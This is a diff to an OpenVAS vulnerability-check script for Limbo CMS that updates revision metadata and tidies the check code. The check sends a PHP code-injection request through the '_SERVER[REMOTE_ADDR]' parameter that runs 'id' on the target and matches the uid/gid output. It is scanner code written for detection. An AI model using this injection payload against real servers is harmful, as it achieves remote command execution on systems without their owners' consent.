@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: limbo_multiple_flaws.nasl 6063 2017-05-03 09:03:05Z teissa $
+# $Id: limbo_multiple_flaws.nasl 7165 2017-09-18 08:57:44Z cfischer $
 # Description: Limbo CMS Multiple Vulnerabilities
 #
 # Authors:
@@ -52,8 +52,8 @@ tag_solution = "Apply the patch http://www.limbo-cms.com/downs/patch_1_0_4_2.zip
 if(description)
 {
  script_id(20824);
- script_version("$Revision: 6063 $");
- script_tag(name:"last_modification", value:"$Date: 2017-05-03 11:03:05 +0200 (Wed, 03 May 2017) $");
+ script_version("$Revision: 7165 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-09-18 10:57:44 +0200 (Mon, 18 Sep 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -87,19 +87,15 @@ if(description)
  exit(0);
 }
 
-# The script code starts here
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
-
 
 http_check_remote_code(
   extra_dirs:"",
-  check_request:string(d, "/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1"),
+  check_request:string("/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1"),
   check_result:"uid=[0-9]+.*gid=[0-9]+.*",
   command:"id",
   port:port
